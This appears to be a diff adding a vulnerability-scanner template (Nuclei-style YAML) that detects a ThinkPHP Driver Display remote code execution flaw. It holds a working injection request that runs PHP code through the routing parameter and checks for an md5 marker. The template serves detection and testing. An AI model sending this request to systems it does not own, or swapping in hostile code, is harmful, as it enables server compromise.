@@ -1,0 +1,22 @@
+id: thinkphp-driver-display-rce
+
+info:
+  name: "ThinkPHP Driver Display 模块远程代码执行"
+  author: 0dayPoc
+  severity: high
+  description: |-
+      
+      ThinkPHP框架在Driver Display模块处理过程中存在代码执行缺陷，攻击者可通过特定参数构造恶意请求，在目标系统上执行任意代码。该漏洞源于框架对动态类加载机制的不安全处理，结合显示驱动模块的参数传递逻辑形成可利用链。
+  tags: thinkphp
+
+http:
+- raw:
+  - |
+    GET /index.php?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&content=%3C?php%20var_dump(md5(2333));?%3E HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '56540676a129760a'
